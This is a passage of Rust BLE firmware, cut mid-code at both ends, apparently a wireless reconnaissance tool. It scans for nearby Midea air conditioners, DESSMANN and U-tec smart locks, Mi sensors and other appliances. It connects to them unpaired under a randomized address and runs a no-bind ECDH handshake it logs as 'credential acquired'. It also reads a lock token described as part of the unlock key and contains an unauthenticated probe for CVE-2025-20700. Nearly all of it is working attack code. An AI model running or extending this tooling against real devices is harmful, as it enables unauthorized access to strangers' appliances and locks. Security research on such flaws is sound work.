                        let buf = unsafe { &*RX_BUF.0.get() };
                        let pdu_type = buf[0] & 0x0F;
                        let len = buf[1] as usize;
                        // ADV_IND (0x00) only — ADV_DIRECT_IND (0x01) carries an
                        // InitA field naming its intended initiator; our CONNECT_IND
                        // is silently ignored if InitA doesn't match our address.
                        // Midea appliances always use undirected ADV_IND anyway.
                        if pdu_type == 0x00 && len >= 6 {
                            let addr = [buf[2], buf[3], buf[4], buf[5], buf[6], buf[7]];
                            let addr_random = (buf[0] >> 6) & 1 == 1;
                            // Only devices whose type is identifiable from the advert
                            // alone become probe targets — we do not connect just to
                            // classify: a Midea 0x06A8 serial, a DESSMANN lock (name
                            // `LOCK_`), a MiBeacon sensor, or a weight scale. Every
                            // other advertiser is still counted (`adv_seen`) but is
                            // never connected to.
                            let mut bad_sn = None;
                            let interest = device::classify_interest(&buf[8..2 + len], &mut bad_sn);
                            if let Some(sn) = bad_sn
                                && !others.iter().any(|o| o == &sn)
                            {
                                let _ = others.push(sn);
                                ulogf!("rscan: corrupt sn (skipped)\r\n");
                            }
                            if interest.is_some() {
                                // The v2 capability block (broadcast rarely) carries
                                // the bind/config posture — a passive per-device auth
                                // readout, no connect needed. `is_ble_controller`
                                // flags the FFA0 direct-control / no-bind path (ACs).
                                let cap = device::midea::capability_of_ad(&buf[8..2 + len]);
                                if let Some(cap) = cap {
                                    ulogf!("rscan: midea bind {}\r\n", cap.fmt());
                                }
                                if let Some(c) = found.iter_mut().find(|c| c.addr == addr) {
                                    if rssi > c.rssi {
                                        c.rssi = rssi;
                                    }
                                    // First classification wins — a device does not
                                    // change type mid-scan; same for the capability.
                                    if c.interest.is_none() {
                                        c.interest = interest;
                                    }
                                    if c.cap.is_none() {
                                        c.cap = cap;
                                    }
                                } else {
                                    let _ = found.push(Candidate {
                                        addr,
                                        addr_random,
                                        rssi,
                                        interest,
                                        cap,
                                    });
                                }
                                // On-the-go: stop scanning the moment we see a
                                // qualifying Midea advert above the RSSI floor that
                                // is NOT in cooldown. Without the cooldown check, a
                                // device that was just probed triggers ~30 scan
                                // restarts per second (Midea advertises at ~100 ms).
                                if PARAMS.interrupt_on_midea
                                    && rssi >= PARAMS.rssi_floor
                                    && !in_cooldown(recent, &addr)
                                {
                                    r.shorts().write(|_w| {});
                                    r.tasks_disable().write_value(1);
                                    let _ = wait_disabled();
                                    ulogf!(
                                        "rscan: interrupt — midea adv rssi={} (on-the-go)\r\n",
                                        rssi
                                    );
                                    return (found, adv_seen);
                                }
                            }
                        }
                    }
                    r.tasks_start().write_value(1);
                }
                Timer::after_micros(200).await;
                rng.stir(r.rssisample().read().rssisample() as u32);
            }
            r.shorts().write(|_w| {});
            r.tasks_disable().write_value(1);
            let _ = wait_disabled();
            r.events_disabled().write_value(0);
        }
    }
    (found, adv_seen)
}

/// Connect to `e` and run a full GATT enumeration — which logs the whole attribute
/// tree, reads every readable value (logging insufficient-auth failures), and
/// subscribes to notifiable characteristics. Returns the live connection, the
/// Midea control profile *if present* (FFA1/FFA2), and the service count; `None`
/// (radio left DISABLED) on connect failure. The caller branches and always
/// closes.
/// Connect, raise the MTU, discover services, and locate the FFA1/FFA2 control
/// profile — enabling FFA2 notifications so the handshake, which runs before the
/// heavier full walk, can receive its replies. Returns the live link, the profile
/// if the device exposes one, and the service list for the caller to walk.
/// What a probe's service discovery classified the device as, plus whichever
/// control profile it located (with its notify CCCD already enabled).
struct Classified {
    kind: DeviceKind,
    midea: Option<device::midea::gatt::Profile>,
    airoha: Option<device::airoha::Profile>,
    dessmann: Option<device::dessmann::Profile>,
    miscale: Option<device::mi::Profile>,
}

/// Reconstruct the scan-time interest for a table entry, for the handshake
/// paths that take a `Candidate` (the table only stores the Midea SN + kind).
fn entry_interest(e: &DeviceEntry) -> Option<Interest> {
    e.sn.map(|s| Interest::Midea { sn: s, mac: e.mac })
        .or(e.ps.map(Interest::PortaSplit))
        .or(e.fl.map(Interest::FanLight))
        .or(if e.kind == DeviceKind::Haier {
            Some(Interest::Haier)
        } else {
            None
        })
        .or(if e.kind == DeviceKind::Hisense {
            Some(Interest::Hisense)
        } else {
            None
        })
        .or(if e.kind == DeviceKind::Jomoo {
            Some(Interest::Jomoo)
        } else {
            None
        })
        .or(match e.kind {
            DeviceKind::Dessmann => Some(Interest::Dessmann),
            DeviceKind::Utech => Some(Interest::Utech),
            DeviceKind::Misensor => Some(Interest::MiSensor),
            DeviceKind::Miscale => Some(Interest::MiScale),
            _ => None,
        })
}

/// Connect to a candidate and raise the ATT MTU — the common front half of a
/// probe. The caller branches after this: the Midea path goes straight to a
/// targeted profile resolve (no full service walk), everything else runs the
/// full discovery + [`classify`] in [`open`].
async fn connect_and_mtu(rng: &mut Rng, e: &DeviceEntry, rounds: u32) -> Option<Conn> {
    CONN_AA.store(pick_access_address(rng), Ordering::Relaxed);
    pick_conn_params(rng);
    randomize_our_addr(rng);
    let cand = Candidate {
        addr: e.addr,
        addr_random: e.addr_random,
        rssi: 0,
        interest: entry_interest(e),
        cap: e.cap,
    };
    let mut cstat = ConnectStats::default();
    let Some(mut conn) = try_connect_rounds(&cand, &mut cstat, rounds).await else {
        ulogf!(
            "  connect failed (target={} connectable={})\r\n",
            cstat.target,
            cstat.connectable
        );
        flash(led::RED, 1); // no link
        ensure_disabled();
        configure_ble();
        return None;
    };
    configure_conn_radio();
    // Raise the MTU (optional, short budget); discovery is left to the caller.
    exchange_mtu(&mut conn).await;
    Some(conn)
}

/// Connect, raise the MTU, discover services, and classify the control profile —
/// the full-walk path used by every device kind except Midea (which resolves its
/// profile by targeted Find By Type Value in [`probe_midea_direct`] instead).
async fn open(
    rng: &mut Rng,
    e: &DeviceEntry,
) -> Option<(Conn, Classified, heapless::Vec<Service, MAX_SERVICES>)> {
    let mut conn = connect_and_mtu(rng, e, SURVEY_ROUNDS * 2).await?;
    let mut services: heapless::Vec<Service, MAX_SERVICES> = heapless::Vec::new();
    discover_services(&mut conn, &mut services).await;
    ulogf!("  services = {}\r\n", services.len());

    let cls = if conn.ev_addr != 0 {
        classify(&mut conn, &services).await
    } else {
        Classified {
            kind: e.kind,
            midea: None,
            airoha: None,
            dessmann: None,
            miscale: None,
        }
    };
    ulogf!("  classified = {}\r\n", cls.kind);
    Some((conn, cls, services))
}

/// Enable the notify/indicate CCCD of characteristic `ci` (its descriptor range
/// runs from its value handle to just before the next characteristic, or the
/// service end). Both control branches must subscribe before writing so the peer
/// will answer on the notify characteristic. `pub(super)` so the targeted-profile
/// resolve in [`midea`] can subscribe the notify char it just found.
pub(super) async fn enable_cccd(
    conn: &mut Conn,
    chars: &[Characteristic],
    ci: usize,
    svc_end: u16,
) {
    let ch = chars[ci];
    let desc_to = if ci + 1 < chars.len() {
        chars[ci + 1].decl_handle.saturating_sub(1)
    } else {
        svc_end
    };
    if let Some(cccd) = discover_descriptors(conn, ch.value_handle + 1, desc_to).await {
        subscribe(conn, cccd, ch.props).await;
    }
}

/// Inspect the discovered services and locate a known control profile — Midea
/// (FFA0/FFA1/FFA2) or Airoha RACE (write/notify pair) — enabling the notify CCCD
/// of whichever it finds. Everything else classifies as `Generic`.
async fn classify(conn: &mut Conn, services: &[Service]) -> Classified {
    use device::midea::gatt as mgatt;
    let mut out = Classified {
        kind: DeviceKind::Generic,
        midea: None,
        airoha: None,
        dessmann: None,
        miscale: None,
    };
    for svc in services {
        let su = &svc.uuid[..svc.uuid_len as usize];
        if mgatt::role(su) == Some(mgatt::Role::Service) {
            // Midea control service: FFA1 (write) + FFA2 (notify).
            let mut chars: heapless::Vec<Characteristic, MAX_CHARS_PER_SVC> = heapless::Vec::new();
            discover_characteristics(conn, svc, &mut chars).await;
            let (mut w, mut n) = (None, None);
            for ci in 0..chars.len() {
                match mgatt::role(&chars[ci].uuid[..chars[ci].uuid_len as usize]) {
                    Some(mgatt::Role::Write) => w = Some(chars[ci].value_handle),
                    Some(mgatt::Role::Notify) => {
                        n = Some(chars[ci].value_handle);
                        enable_cccd(conn, &chars, ci, svc.end).await;
                    }
                    _ => {}
                }
            }
            if let (Some(write_h), Some(notify_h)) = (w, n) {
                out.kind = DeviceKind::Midea;
                out.midea = Some(mgatt::Profile { write_h, notify_h });
            }
        } else if device::dessmann::is_dessmann_service(svc_uuid16(svc)) {
            // DESSMANN smart-lock command channel: write 0xFFE9 + notify 0xFFE4,
            // split across services 0xFFE0 (notify) and 0xFFE5 (write).
            let mut chars: heapless::Vec<Characteristic, MAX_CHARS_PER_SVC> = heapless::Vec::new();
            discover_characteristics(conn, svc, &mut chars).await;
            let (mut w, mut n) = (None, None);
            for ci in 0..chars.len() {
                match device::dessmann::char_role(char_uuid16(&chars[ci])) {
                    Some(device::dessmann::Role::Write) => w = Some(chars[ci].value_handle),
                    Some(device::dessmann::Role::Notify) => {
                        n = Some(chars[ci].value_handle);
                        enable_cccd(conn, &chars, ci, svc.end).await;
                    }
                    _ => {}
                }
            }
            if let (Some(write_h), Some(notify_h)) = (w, n) {
                out.kind = DeviceKind::Dessmann;
                out.dessmann = Some(device::dessmann::Profile { write_h, notify_h });
            }
        } else if device::mi::is_scale_service(&svc.uuid[..svc.uuid_len as usize]) {
            // Mi Body Composition Scale: a config write + a measurement notify
            // channel (Newbit `MI_Scale` clone).
            let mut chars: heapless::Vec<Characteristic, MAX_CHARS_PER_SVC> = heapless::Vec::new();
            discover_characteristics(conn, svc, &mut chars).await;
            let (mut cfg, mut n) = (None, None);
            for ci in 0..chars.len() {
                match device::mi::char_role(&chars[ci].uuid[..chars[ci].uuid_len as usize]) {
                    Some(device::mi::Role::Config) => cfg = Some(chars[ci].value_handle),
                    Some(device::mi::Role::Notify) => {
                        n = Some(chars[ci].value_handle);
                        enable_cccd(conn, &chars, ci, svc.end).await;
                    }
                    _ => {}
                }
            }
            if let (Some(config_h), Some(notify_h)) = (cfg, n) {
                out.kind = DeviceKind::Miscale;
                out.miscale = Some(device::mi::Profile { config_h, notify_h });
            }
        }
        // ── Airoha RACE detection: DISABLED for now (we do not probe earbuds) ──
        // With this branch commented out, an Airoha earbud classifies as Generic and
        // is skipped. The assessment path (`airoha_assess` in this module) and the
        // `device::airoha` module are left intact; re-enable by restoring this branch
        // as `} else if device::airoha::is_race_service(su) {` above.
        //
        // else if device::airoha::is_race_service(su) {
        //     // Airoha RACE service: a write (TX) + notify (RX) pair.
        //     let mut chars: heapless::Vec<Characteristic, MAX_CHARS_PER_SVC> = heapless::Vec::new();
        //     discover_characteristics(conn, svc, &mut chars).await;
        //     let (mut tx, mut rx) = (None, None);
        //     for ci in 0..chars.len() {
        //         let ch = chars[ci];
        //         let r = device::airoha::role(&ch.uuid[..ch.uuid_len as usize]);
        //         let is_tx = r == Some(device::airoha::Role::Tx) || (r.is_none() && ch.props & 0x0C != 0);
        //         let is_rx = r == Some(device::airoha::Role::Rx) || (r.is_none() && ch.props & 0x10 != 0);
        //         if is_tx && tx.is_none() { tx = Some(ch.value_handle); }
        //         if is_rx && rx.is_none() {
        //             rx = Some(ch.value_handle);
        //             enable_cccd(conn, &chars, ci, svc.end).await;
        //         }
        //     }
        //     if let (Some(tx_h), Some(rx_h)) = (tx, rx) {
        //         out.kind = DeviceKind::Airoha;
        //         out.airoha = Some(device::airoha::Profile { tx_h, rx_h });
        //     }
        // }
    }
    out
}

/// Airoha RACE assessment: send the confirmed unauthenticated READ_SDK_VERSION
/// command and await the reply. A well-formed RACE response from a device we never
/// paired with is the CVE-2025-20700 missing-authentication exposure; log it.
async fn airoha_assess(conn: &mut Conn, prof: &device::airoha::Profile) -> bool {
    // Unauthenticated info-disclosure probes (CVE-2025-20700). READ_SDK_VERSION is
    // byte-confirmed; GET_BD_ADDRESS is built from the confirmed framing + the
    // reference opcode. Any well-formed RACE reply is the exposure.
    const PROBES: &[(&str, u16)] = &[
        ("READ_SDK_VERSION", device::airoha::CMD_READ_SDK_VERSION),
        ("GET_BD_ADDRESS", device::airoha::CMD_GET_BD_ADDRESS),
    ];
    let mut out = [0u8; ATT_MTU_MAX];
    let mut exposed = false;
    for (name, cmd) in PROBES {
        let Some(req) = device::airoha::build_cmd(*cmd, &[], true) else {
            continue;
        };
        ulogf!("  airoha: RACE {} (unauthenticated probe)\r\n", name);
        if let Some(n) =
            att_write_await_notify(conn, prof.tx_h, &req, prof.rx_h, HS_REPLY_EVENTS, &mut out)
                .await
        {
            if let Some((rcmd, payload)) = device::airoha::parse_reply(&out[..n]) {
                exposed = true;
                let mut s = decoder::LogStr::new();
                let _ = write!(
                    s,
                    "  airoha: {} reply cmd=0x{:04X} EXPOSED payload=",
                    name, rcmd
                );
                for &b in payload.iter().take(24) {
                    let _ = write!(s, "{:02X}", b);
                }
                decoder::emit(s);
            } else {
                ulogf!("  airoha: {} reply not a RACE frame (len={})\r\n", name, n);
            }
        } else {
            ulogf!("  airoha: {} no reply\r\n", name);
        }
    }
    flash(if exposed { led::GREEN } else { led::YELLOW }, 2);
    exposed
}
/// 16-bit value of a service UUID — the shared extraction is
/// [`crate::device::uuid16`].
fn svc_uuid16(s: &Service) -> Option<u16> {
    device::uuid16(&s.uuid[..s.uuid_len as usize])
}

/// Same 16-bit extraction as [`svc_uuid16`], for a characteristic UUID.
fn char_uuid16(c: &Characteristic) -> Option<u16> {
    device::uuid16(&c.uuid[..c.uuid_len as usize])
}

/// Tear the link down and leave the radio ready for the next cycle.
async fn close(conn: &mut Conn) {
    if conn.ev_addr != 0 {
        terminate(conn).await;
    }
    ensure_disabled();
    configure_ble();
}

/// Probe one device: connect + enumerate, then branch on the control profile —
/// handshake + status listen if FFA1/FFA2 is present, else the subscribe the walk
/// already did — listen up to [`LISTEN_SECS`], and disconnect. Returns the probe
/// and handshake outcomes for the table.
async fn probe_device(rng: &mut Rng, e: &DeviceEntry) -> (ProbeState, DeviceKind, HandshakeState) {
    let a = e.addr;
    let t0 = Instant::now();
    ulogf!(
        "rprobe: addr={:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} hint={} rssi={} connecting\r\n",
        a[5],
        a[4],
        a[3],
        a[2],
        a[1],
        a[0],
        e.kind,
        e.rssi
    );

    // Midea direct-probe: no full GATT walk. Classification is the advert serial
    // (done at scan time); the control profile is resolved by targeted Find By
    // Type Value — the peer's ATT error response is the existence signal.
    if e.kind == DeviceKind::Midea {
        return probe_midea_direct(rng, e).await;
    }
    // PortaSplit is a separate family — its own targeted FF02/FF01 probe.
    if e.kind == DeviceKind::PortaSplit {
        return probe_portasplit(rng, e).await;
    }
    // Fan-and-light is another separate family — its own targeted AAAA probe.
    if e.kind == DeviceKind::FanLight {
        return probe_fanlight(rng, e).await;
    }

    set_phase(Phase::Enumerate);
    let Some((mut conn, cls, services)) = open(rng, e).await else {
        set_phase(Phase::Idle);
        return (ProbeState::ProbeFailed, e.kind, HandshakeState::NoHandshake);
    };
    let kind = cls.kind;

    // If the peer never sent a data-channel packet (`ev_addr == 0`: CONNECT_IND
    // accepted but we never heard back — common when signal is too weak for
    // bidirectional data) or service discovery returned nothing (link lost during
    // enumerate), we got nothing useful from this connection. Treat it as a failed
    // probe so the device stays a candidate next round and is retried — weak-signal
    // devices should not be frozen out of future scans.
    if conn.ev_addr == 0 || services.is_empty() {
        ulogf!(
            "rprobe: link yielded nothing (ev_addr={} services={}) — no data, stays a candidate\r\n",
            conn.ev_addr,
            services.len()
        );
        set_phase(Phase::Idle);
        close(&mut conn).await;
        return (ProbeState::ProbeFailed, e.kind, HandshakeState::NoHandshake);
    }

    // MiBeacon sensor (XMZNMS08LM door/window, LYWSD03MMC temp/humidity): no
    // control profile, but the GATT walk reads its sensor values (temperature,
    // humidity, battery on the stock LYWSD03MMC). Probe with the walk rather
    // than skipping.
    if e.kind == DeviceKind::Misensor {
        set_phase(Phase::Enumerate);
        let subscribed = mi::probe_sensor(&mut conn, &services).await;
        // A connectable Mi device exposes the 0xFE95 auth service — read its
        // firmware + attempt the beacon key to report the bind posture.
        device::mi::probe_fe95(&mut conn, &services).await;
        ulogf!(
            "rprobe: misensor done services={} subs={} in {}ms\r\n",
            services.len(),
            subscribed,
            (Instant::now() - t0).as_millis()
        );
        set_phase(Phase::Idle);
        close(&mut conn).await;
        return (ProbeState::Probed, e.kind, HandshakeState::NoHandshake);
    }

    // U-tec / ULTRALOQ smart lock: no control profile of ours, but the GATT walk
    // reads every readable value — including the 0x7220 token characteristic
    // (part of the unlock AES key construction) — so probe with the walk.
    if e.kind == DeviceKind::Utech {
        set_phase(Phase::Enumerate);
        let subscribed = device::utech::probe(&mut conn, &services).await;
        ulogf!(
            "rprobe: utech done services={} subs={} in {}ms\r\n",
            services.len(),
            subscribed,
            (Instant::now() - t0).as_millis()
        );
        set_phase(Phase::Idle);
        close(&mut conn).await;
        return (ProbeState::Probed, e.kind, HandshakeState::NoHandshake);
    }
    // Haier U-home appliance (mfg 0x0929) — connect and GATT-walk to learn what
    // a raw connection serves (identity? pairing config? a control profile?).
    if e.kind == DeviceKind::Haier {
        set_phase(Phase::Enumerate);
        let subscribed = device::haier::probe(&mut conn, &services).await;
        ulogf!(
            "rprobe: haier done services={} subs={} in {}ms\r\n",
            services.len(),
            subscribed,
            (Instant::now() - t0).as_millis()
        );
        set_phase(Phase::Idle);
        close(&mut conn).await;
        return (ProbeState::Probed, e.kind, HandshakeState::NoHandshake);
    }
    // Hisense smart-life appliance (ServiceData16 0xF005) — connect and GATT-walk
    // to map its `3a69…` BLE control profile (write temp/mode/power + notify).
    if e.kind == DeviceKind::Hisense {
        set_phase(Phase::Enumerate);
        let subscribed = device::hisense::probe(&mut conn, &services).await;
        ulogf!(
            "rprobe: hisense done services={} subs={} in {}ms\r\n",
            services.len(),
            subscribed,
            (Instant::now() - t0).as_millis()
        );
        set_phase(Phase::Idle);
        close(&mut conn).await;
        return (ProbeState::Probed, e.kind, HandshakeState::NoHandshake);
    }
    // JOMOO smart bathroom (name `JOMOO…`) — connect and GATT-walk to map its
    // Telink `0xFFF0` control profile (write 0xFFF2 / notify 0xFFF1).
    if e.kind == DeviceKind::Jomoo {
        set_phase(Phase::Enumerate);
        let subscribed = device::jomoo::probe(&mut conn, &services).await;
        ulogf!(
            "rprobe: jomoo done services={} subs={} in {}ms\r\n",
            services.len(),
            subscribed,
            (Instant::now() - t0).as_millis()
        );
        set_phase(Phase::Idle);
        close(&mut conn).await;
        return (ProbeState::Probed, e.kind, HandshakeState::NoHandshake);
    }

    // No known control profile → not a recon target. Full enumerate + listen is the
    // GATT-enum mode's job, so skip it here and disconnect. It still counts as a
    // completed probe (cooldown applies) so we do not reconnect it every round —
    // and the profile is stable knowledge, so the cooldown is the long tier.
    if cls.midea.is_none()
        && cls.airoha.is_none()
        && cls.dessmann.is_none()
        && cls.miscale.is_none()
    {
        ulogf!(
            "rprobe: {} — no known control profile, skipping\r\n",
            e.kind
        );
        set_phase(Phase::Idle);
        close(&mut conn).await;
        return (ProbeState::Probed, e.kind, HandshakeState::NoControl);
    }

    // Assessment on the fresh link, before the heavy walk — a peer can drop the
    // link during a long enumeration, so the credential/probe comes first.
    let mut stats = midea::HsStats::default();
    let mut hs = None;
    let mut hs_state = HandshakeState::NoHandshake;
    if let Some(prof) = cls.midea {
        set_phase(Phase::Handshake);
        // The probe needs the advert serial (rootKey) + address, recorded in the
        // table when the device was scanned.
        let (sn, addr) = match (e.sn, e.addr) {
            (Some(sn), addr) => (sn, addr),
            _ => {
                set_phase(Phase::Idle);
                return (ProbeState::ProbeFailed, kind, HandshakeState::NoHandshake);
            }
        };
        match midea::probe(&mut conn, &prof, &sn, &addr, e.mac, &mut stats).await {
            midea::HsOutcome::Complete(h) => hs = Some(h),
            midea::HsOutcome::SecError => hs_state = HandshakeState::Unsupported,
            midea::HsOutcome::NoReply => hs_state = HandshakeState::HandshakeFail,
        }
    } else if let Some(prof) = cls.airoha {
        set_phase(Phase::Handshake);
        hs_state = if airoha_assess(&mut conn, &prof).await {
            HandshakeState::HandshakeSuccessful
        } else {
            HandshakeState::HandshakeFail
        };
    } else if let Some(prof) = cls.dessmann {
        set_phase(Phase::Handshake);
        dessmann::probe(&mut conn, &prof).await;
    } else if let Some(prof) = cls.miscale {
        set_phase(Phase::Handshake);
        mi::probe_scale(&mut conn, &prof).await;
    }

    // Post-handshake walk. Sit-still: the full GATT tree (log everything).
    // On-the-go: targeted walk of only the Midea-protocol services — the same set
    // midea-ble-go probes (FFA0, FF90, Device Info, GAP). Gives the char handles,
    // readable values and subscription state without the 8–14 s cost of a 13-service
    // walk while the device may be walking away.
    set_phase(Phase::Enumerate);
    let subscribed = if PARAMS.full_walk {
        walk_services(&mut conn, &services, |_vh, _uuid| {}).await
    } else if (cls.midea.is_some() && hs.is_none())
        || cls.dessmann.is_some()
        || cls.miscale.is_some()
    {
        // The control profile is already known from classify, and the device just
        // rejected / ignored the handshake (Midea) or is a DESSMANN lock whose
        // channel (FFE9/FFE4) we already probed. Re-walking after a failure or a
        // completed lock probe only burns link time on services that did not
        // answer — the silent-profile burn. Skip it.
        ulogf!("  profile walk skipped (handshake failed / lock probed)\r\n");
        0
    } else {
        let targeted: heapless::Vec<Service, MAX_SERVICES> = services
            .iter()
            .filter(|s| device::midea::is_service(svc_uuid16(s)))
            .copied()
            .collect();
        walk_services(&mut conn, &targeted, |_vh, _uuid| {}).await
    };

    // Report. A handshaked Midea device already got its status via the active
    // status-query probe (sent inside `midea::probe` right after c3), so no
    // passive GATT notification listen runs here; the link is torn down directly.
    set_phase(Phase::Listen);
    if let (Some(_prof), Some(_hsv)) = (cls.midea, hs.as_ref()) {
        flash(led::GREEN, 2); // credential acquired
        hs_state = HandshakeState::HandshakeSuccessful;
        ulogf!(
            "rprobe: midea OK status={} services={} in {}ms\r\n",
            stats.status,
            services.len(),
            (Instant::now() - t0).as_millis()
        );
    } else if cls.midea.is_some() {
        flash(led::YELLOW, 2);
        hs_state = HandshakeState::HandshakeFail;
        ulogf!(
            "rprobe: midea handshake FAIL services={} in {}ms\r\n",
            services.len(),
            (Instant::now() - t0).as_millis()
        );
    } else {
        if subscribed > 0 {
            listen_notifications(&mut conn, LISTEN_EVENTS).await;
        }
        ulogf!(
            "rprobe: {} done services={} subs={} in {}ms\r\n",
            kind,
            services.len(),
            subscribed,
            (Instant::now() - t0).as_millis()
        );
    }

    set_phase(Phase::Idle);
    close(&mut conn).await; // disconnect (terminate if the link was live)
    (ProbeState::Probed, kind, hs_state)
}

/// Probe a Midea candidate without the full GATT walk: classification is the
/// advert serial (scan-time SN + [`device::midea::device_type`]), and the control
/// profile is resolved by targeted Find By Type Value — the peer's ATT error
/// response is the existence signal. Tries the AC control service `0xFFA0`
/// (FFA1/FFA2, the ECDH handshake) and the PortaSplit OEM-key service
/// `0xFF02/0xFF01`, reporting each profile's existence / gating so a
/// bind-required appliance shows up as `gated` rather than a silent
/// "no known control profile".
async fn probe_midea_direct(
    rng: &mut Rng,
    e: &DeviceEntry,
) -> (ProbeState, DeviceKind, HandshakeState) {
    let t0 = Instant::now();
    // The FFA0 ECDH handshake is the no-bind digital-control path. Probe every
    // Midea AC and any device advertising `is_ble_controller` (ctl=Y); the
    // server's mode-17 whitelist (`getIotCodes`) is *logged, not gated on* —
    // it may be incomplete, so probing lets the handshake be the test for which
    // appliances actually serve FFA0. Non-AC appliances with ctl=N (washers,
    // water heaters that advertise the bit absent) won't answer FFA0, so they
    // are skipped rather than wasting a connect.
    let no_bind =
        e.sn.map(|s| device::midea::sn8_no_bind(&s))
            .unwrap_or(false);
    let is_ac = e.sn.map(|s| s[8..10] == b"AC"[..]).unwrap_or(false);
    let ctl = e.cap.map(|c| c.is_ble_controller).unwrap_or(false);
    match e.sn {
        Some(sn) => ulogf!(
            "  midea: sn={} type={} ctl={} no-bind={}\r\n",
            sn_string(&sn),
            device::midea::device_type(&sn),
            if ctl { "Y" } else { "N" },
            if no_bind { "Y" } else { "N" }
        ),
        None => ulogf!(
            "  midea: no serial (ctl={})\r\n",
            if ctl { "Y" } else { "N" }
        ),
    }
    if !(ctl || is_ac) {
        ulogf!("  midea: ctl=N and not an AC — no FFA0 probe\r\n");
        set_phase(Phase::Idle);
        return (
            ProbeState::Probed,
            DeviceKind::Midea,
            HandshakeState::NoControl,
        );
    }
    set_phase(Phase::Enumerate);
    // The no-bind ACs advertise connectably on a ~2 s cadence; the longer
    // window makes sure the connect hears at least one advert (the survey-sized
    // window missed it — `target=0` — on most attempts).
    let Some(mut conn) = connect_and_mtu(rng, e, CONNECT_ROUNDS).await else {
        set_phase(Phase::Idle);
        return (
            ProbeState::ProbeFailed,
            DeviceKind::Midea,
            HandshakeState::NoHandshake,
        );
    };
    // No data-channel packet → link lost during connect; keep the device a
    // candidate so it is retried next round.
    if conn.ev_addr == 0 {
        ulogf!("rprobe: link yielded nothing (ev_addr=0) — no data, stays a candidate\r\n");
        set_phase(Phase::Idle);
        close(&mut conn).await;
        return (
            ProbeState::ProbeFailed,
            DeviceKind::Midea,
            HandshakeState::NoHandshake,
        );
    }
    let (sn, addr) = match (e.sn, e.addr) {
        (Some(sn), addr) => (sn, addr),
        _ => {
            set_phase(Phase::Idle);
            close(&mut conn).await;
            return (
                ProbeState::ProbeFailed,
                DeviceKind::Midea,
                HandshakeState::NoHandshake,
            );
        }
    };

    let mut hs_state = HandshakeState::NoHandshake;

    // FFA0 — the AC control service (FFA1 write + FFA2 notify). The Midea/Mijia
    // app's AC path is `RemoteControllerDevice` over FFA0/FFA1/FFA2 (C1→C2→C3
    // key exchange + t3 business frames, no bind required). Fast path first:
    // derive the handles from the service start (`midea::resolve_ffa0_fast`);
    // fall back to full characteristic discovery when the derived CCCD write
    // fails. (The PortaSplit OEM-key profile is a separate device type and is not
    // probed here.)
    let fast = midea::resolve_ffa0_fast(&mut conn).await;
    let used_fast = matches!(fast, SvFind::Found(_));
    let mut prof = match fast {
        SvFind::Found(p) => {
            ulogf!(
                "  midea: FFA0 present (derived write={:04X} notify={:04X})\r\n",
                p.write_h,
                p.notify_h
            );
            Some(p)
        }
        SvFind::Absent => {
            ulogf!("  midea: FFA0 absent (err 0x0A)\r\n");
            None
        }
        SvFind::Gated(code) => {
            ulogf!(
                "  midea: FFA0 gated (err 0x{:02X} {}) — device not serving ATT\r\n",
                code,
                crate::central::att_error_name(code)
            );
            None
        }
        // Layout-uncertain (derived CCCD failed) or link lost.
        SvFind::NoChars | SvFind::Unknown => None,
    };
    // The resolve conclusion for the cooldown tier. Starts as the fast outcome;
    // the fallbacks overwrite it when one runs.
    let mut ffa0_concl = Some(fast);
    // The targeted Find-By-Type-Value found nothing. A serving AC can still be
    // reached through the full primary-service walk Android's connectGatt
    // performs — a live link that ignores FBTV yet answers MTU (seen in the
    // 09-01 recon: `find 0xFFA0: no ATT response` beside `mtu = 247`) is the
    // signature of an ATT server that answers the standard discovery but not a
    // targeted find. Walk the table before concluding. A clean `Absent` error
    // response is already conclusive, so it skips the walk.
    if prof.is_none() && !matches!(fast, SvFind::Absent) {
        let mut services: heapless::Vec<Service, MAX_SERVICES> = heapless::Vec::new();
        discover_services(&mut conn, &mut services).await;
        if let Some(svc) = services
            .iter()
            .find(|s| device::uuid16(&s.uuid[..s.uuid_len as usize]) == Some(0xFFA0))
        {
            let p = device::midea::gatt::Profile {
                write_h: svc.start + 2,
                notify_h: svc.start + 5,
            };
            ulogf!(
                "  midea: FFA0 found via full discovery (write={:04X} notify={:04X})\r\n",
                p.write_h,
                p.notify_h
            );
            prof = Some(p);
            ffa0_concl = Some(SvFind::Found(p));
        }
    }

    // The ECDH handshake runs only on a resolved FFA0 profile.
    if let Some(p) = prof {
        set_phase(Phase::Handshake);
        let mut stats = midea::HsStats::default();
        let mut outcome = midea::probe(&mut conn, &p, &sn, &addr, e.mac, &mut stats).await;
        // A no-reply on *derived* handles may mean a non-standard char ordering —
        // retry once via full discovery before giving up.
        if used_fast
            && matches!(outcome, midea::HsOutcome::NoReply)
            && let SvFind::Found(p2) =
                resolve_profile(&mut conn, 0xFFA0, 0xFFA1, Some(0xFFA2)).await
        {
            outcome = midea::probe(&mut conn, &p2, &sn, &addr, e.mac, &mut stats).await;
        }
        match outcome {
            midea::HsOutcome::Complete(_) => {
                flash(led::GREEN, 2); // credential acquired
                hs_state = HandshakeState::HandshakeSuccessful;
                ulogf!(
                    "rprobe: midea OK status={} in {}ms\r\n",
                    stats.status,
                    (Instant::now() - t0).as_millis()
                );
            }
            midea::HsOutcome::SecError => hs_state = HandshakeState::Unsupported,
            midea::HsOutcome::NoReply => hs_state = HandshakeState::HandshakeFail,
        }
    }

    set_phase(Phase::Idle);
    close(&mut conn).await;
    // The device is a Midea by advert serial; the outcome sets the cooldown
    // tier. A definite "no usable control channel" (absent / gated / no chars)
    // is stable knowledge — NoControl, long cooldown, tracked. An inconclusive
    // resolve (link lost) is a failed probe — short cooldown, retried.
    let mut probe_state = ProbeState::Probed;
    if hs_state == HandshakeState::NoHandshake {
        match ffa0_concl {
            Some(SvFind::Absent) | Some(SvFind::Gated(_)) | Some(SvFind::NoChars) => {
                hs_state = HandshakeState::NoControl;
            }
            _ => probe_state = ProbeState::ProbeFailed,
        }
    }
    (probe_state, DeviceKind::Midea, hs_state)
}

/// Probe a PortaSplit candidate: a separate family from Midea with a write-only
/// `0xFF02/0xFF01` control channel and a key derived entirely from the advert
/// (no ECDH handshake). Targeted resolve of FF02/FF01 — the ATT error response is
/// the existence signal — then derive the control key from the advert material so
/// the OEM-key scheme can be cross-checked against a live capture. Recon stays
/// passive: no control writes (they would change the appliance's state).
async fn probe_portasplit(
    rng: &mut Rng,
    e: &DeviceEntry,
) -> (ProbeState, DeviceKind, HandshakeState) {
    let t0 = Instant::now();
    set_phase(Phase::Enumerate);
